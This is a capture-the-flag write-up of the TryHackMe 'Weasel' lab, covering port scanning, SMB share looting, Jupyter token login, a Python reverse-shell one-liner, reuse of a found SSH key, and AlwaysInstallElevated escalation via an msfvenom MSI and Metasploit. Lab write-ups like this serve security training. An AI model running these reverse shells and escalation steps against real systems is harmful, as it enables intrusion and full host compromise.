  ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f70b451f-cdde-4a6a-9c29-a88ef379d3d4)
  https://tryhackme.com/room/weasel

## Enumeration:

I began the enumeration process by conducting a quick rustscan to scan for open ports and services on the target host. The scan revealed 15 open ports:

```bash
sudo rustscan -a 10.10.165.102  -- -sC -sV -vv -oN weasel_nmap
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/72e347fb-ef6c-475a-b9d9-1ec51e111ab8)

```bash
PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBae1NsdsMcZJNQQ2wjF2sxXK2ZF3c7qqW3TN/q91pWiDee3nghS1J1FZrUXaEj0wnAAAbYRg5vbRZRP9oEagBwfWG3QJ9AO6s5UC+iTjX+YKH6phKNmsY5N/LKY4+2EDcwa5R4uznAC/2Cy5EG6s7izvABLcRh3h/w4rVHduiwrueAZF9UjzlHBOxHDOPPVtg+0dniGhcXRuEU5FYRA8/IPL8P97djscu23btk/hH3iqdQWlC9b0CnOkD8kuyDybq9nFaebAxDW4XFj7KjCRuuu0dyn5Sr62FwRXO4wu08ePUEmJF1Gl3/fdYe3vj+iE2yewOFAhzbmFWEWtztjJb
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOGl51l9Z4Mg4hFDcQz8v6XRlABMyVPWlkEXrJIg53piZhZ9WKYn0Gi4fKkzo3blDAsdqpGFQ11wwocBCSJGjQU=
|   256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHw9uTZkIMEgcZPW9Z28Mm+FX66+hkxk+8rOu7oI6J9
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-02T09:37:02+00:00
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Issuer: commonName=DEV-DATASCI-JUP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-03-12T11:46:50
| Not valid after:  2023-09-11T11:46:50
| MD5:   1671 b190 2eb6 b15f 0c3f ab16 d3e6 6582
| SHA-1: c007 197a dd30 f17f 2bdb 65f8 1804 fc6f d081 c7c9
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQPvhxvXPCnJtIgyPRvn3WzjANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9ERVYtREFUQVNDSS1KVVAwHhcNMjMwMzEyMTE0NjUwWhcNMjMw
| OTExMTE0NjUwWjAaMRgwFgYDVQQDEw9ERVYtREFUQVNDSS1KVVAwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQD1iFFVyhggpi7wL6i/UpivF4ynWEUALMJh
| v8t3ypgM+Vrdp7sqDQciG7YMfGhYyz3Za4G03Ppgi+DUu/2qsYfGJbllz8IRaelq
| 5G5DPGSy0lYItHbWEvPbPSWTcEOrxQMIv98lBx5fHbmzIP1mEeIiS7p8bpWGfFuR
| Y/zvTOOWRHcT09/z+6YDdCTztLIgtrE+ZFW1yNUYxqCPl6EdKutmIzDUCDFUyvhq
| jOuv1R3M9XGPGomb99tAdPWQeXwjQfNrJdEsJ0DBz3D9T2pbfVwKINfDt1qCQfPO
| zu9v8OZhe+BYvS6289GNmCbiaCVbeJK2yokPdMFx4uLIT85U7IKBAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAiVcJyTne2cl+bKhmctqIva2DA/v9P0odeZe1hO8TG7J4UZGeK5bOqwdE
| bPDKBuxD+QYXWLm+/eHgKKMwKemYp4iDcIMGfb5UgzkRe8RaI5kKiiPQSarFKIZe
| WphDWZrLDo9IN58b081R4k82IfGv7yXtIjZcral4fCEHhhTdVE2CvHvE1JGXSWbY
| NHoufyrjizsaLHAchdnuHgaz+cgcFgR/hD61vQpc8pW+v6xDNVtMFVdv7lLtbWov
| /dcC6Yd2jtk8sP7ue7K+FOhLaw9UDbji3XCXn0FoJwKBza/K8smP0M/3fHIqoFA2
| mc4b7D2CUHt9FNWIWyz9evlNAOixvg==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-07-02T09:37:11+00:00; +2s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8888/tcp  open  http          syn-ack ttl 127 Tornado httpd 6.0.3
|_http-favicon: Unknown favicon MD5: 97C6417ED01BDC0AE3EF32AE4894FD03
| http-methods: 
|_  Supported Methods: GET POST
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-server-header: TornadoServer/6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44682/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 41197/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38094/udp): CLEAN (Failed to receive data)
|   Check 4 (port 61785/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-02T09:37:05
|_  start_date: N/A
```

From the port scan results, I made several observations:

```
- SMBv2 is enabled, but message signing is not enforced.
- RDP is enabled on port 3389, and the target name is set as "DEV-DATASCI-JUP".
- Port 5985 is open, indicating that PowerShell remoting is enabled.
- Port 8888 is open and running TornadoServer/6.0.3, which is hosting Jupyter notebook.
```

### SMB Enumeration:

With SMB enabled, I proceeded to enumerate the network shares available to me. I utilized SMBmap to list all the shares:

```bash
smbmap -H weasel.thm -u RandomUser
```
I discovered that I had both Read and Write access to the "datasci-team" share, as well as Read access to the IPC$ share.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/0b11cea9-cf6e-48e2-b30b-1925210a35f8)

Further exploring the "datasci-team" share, I found multiple files present within it. To list these files, I used smbmap:
```bash
smbmap -R datasci-team -H weasel.thm -u DoesNotExist
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/dd41e754-5ae5-4ddb-89cc-4848a4a26759)

Using Smbclient, I established a connection and downloaded all the files to my local system:

```bash
smbclient \\\\weasel.thm\\datasci-team -U "DoesNotExist"

smb: \> prompt off #to turn off warnings
smb: \> recurse on #to enable recursive mode
smb: \> mget * # to download all files from the current file path
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/37532ed1-c2f3-48cb-a847-54743fdcfe28)

After downloading all the files, I thoroughly examined them and came across a Jupyter-token inside one of the files.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/2af6f790-3a09-4a3f-926d-f87e2cd0ef65)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial Access:

Based on the port scan results, I knew that port 8888 was running a Tornado server hosting a Jupyter notebook. I accessed the server and discovered an option to log in using a Jupyter token:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b5e2db75-db1b-4584-ac65-29562b8e43ee)

Using the Jupyter token obtained during the SMB scan, I successfully logged into the server:
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/485629a3-b49a-4645-b962-2500e3af6e86)

Upon logging in, I found the same files that I had observed in the "**datasci-team**" share. I opened the "weasel.ipynb" file, which was a Machine Learning file, and examined its contents:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/316183bd-3700-45f2-b293-3780eebd377b)

I discovered that the file executed Python modules and allowed for the inclusion of custom modules. Taking advantage of this, I added a Python reverse shell one-liner to the file:
```python3
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

After running the code, I quickly received a shell back to my netcat listener as the "dev-datasci" user. (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b034c290-d9a1-4403-a173-c1b317f3abcc)

### User Access:

After gaining initial access as the "dev-datasci" user, I searched for other users within the machine but did not find any. I examined the running processes and noticed there were very few. Initially, I suspected that I might be inside a Docker container, but upon further investigation, I discovered that I was actually inside a Windows machine running within the Windows Subsystem for Linux (WSL):

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4a4b80e1-7c6e-4bfb-a4d2-15a86ea02bd4)
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/49e57493-30ca-45a7-adb0-c5d9467ef58f)

During manual enumeration, I checked the home directory of the user and discovered a file named "dev-datasci-lowpriv_id_ed25519," which contained the private SSH key:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/3880ef50-322a-4a68-89ad-904361f04f73)

I copied the key to my local machine, renamed it as "id_rsa," modified the permissions to "chmod 600" in order to use it for SSH login, and then performed the SSH login using the user "dev-datasci-lowpriv":

```bash
ssh -i id_rsa dev-datasci-lowpriv@weasel.thm
```

I successfully logged in and obtained a command prompt as the user "dev-datasci-lowpriv." (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/6b6ec7de-688f-4492-9774-211d025a1913)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

After gaining access to the low privilege user and retrieving the user flag, I began searching for potential privilege escalation vectors. I executed WinPEAS to check for all possible vectors and discovered some interesting results related to the "AlwaysInstallElevated" privilege. I found that "AlwaysInstallElevated" was set to '1' in both HKLM (HKEY_LOCAL_MACHINE) and HKCU (HKEY_CURRENT_USER) registries.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1847e73d-72f2-4c3c-9eb2-be7bc8ce9f30)

Upon further research on the [hacktrickz website](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated) regarding how to exploit this vulnerability for privilege escalation, I discovered that any user with privileges can install ".msi" files with SYSTEM privileges.

Following the provided steps, I created an ".msi" file using 'msfvenom':

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f msi -o update.msi
```
I uploaded the "update.msi" file to the Windows system and executed it:

```
msiexec /quiet /qn /i update.msi
```

However, I did not receive a reverse shell back to my Kali machine for some reason. While investigating why my exploit was not working, I came across a blog that provided some insights:

```
When you run msiexec directly in your SSH session, it uses the current user's privileges and permissions to execute the command. If the user account "dev-datasci-lowpriv" does not have sufficient privileges or lacks necessary permissions, it could result in the failure of the msiexec command.

However, when you use runas /user:dev-datasci-lowpriv to execute msiexec, it runs the command under a different process with the specified user's credentials. This effectively elevates the privileges of the command, potentially bypassing any restrictions or permission issues associated with the current user account.
```
So, I can execute "msiexec" using the "runas" command, but I do not have the current user's credentials.

### Metasploit:

Next, I utilized Metasploit to escalate my privileges. Firstly, I created a session using Metasploit and then migrated myself to another process with higher privileges.

The reason for migration was that when I checked my current privilege level, I discovered that I was running as a low-level user in session 0.
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/58049932-d767-4378-85d6-147329a4d40f)

After successfully migrating, I obtained a higher privilege level in session 1.
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1a1f5905-8429-4bf9-8bf1-9df1105b3a84)

With the elevated privileges, I proceeded to search for a suitable module in Metasploit to exploit the "AlwaysInstallElevated" vulnerability. I located the module under:

```bash
exploit/windows/local/always_install_elevated
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b6de0588-9ec4-4afc-9a56-4a603493bc12)

I utilized the module, modified the variables accordingly, and successfully obtained a session as "NT AUTHORITY\SYSTEM," granting me root privileges. Consequently, I was able to retrieve the root flag as well. (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/509626d7-dc80-4d2b-b7e3-c2a073ef8526)







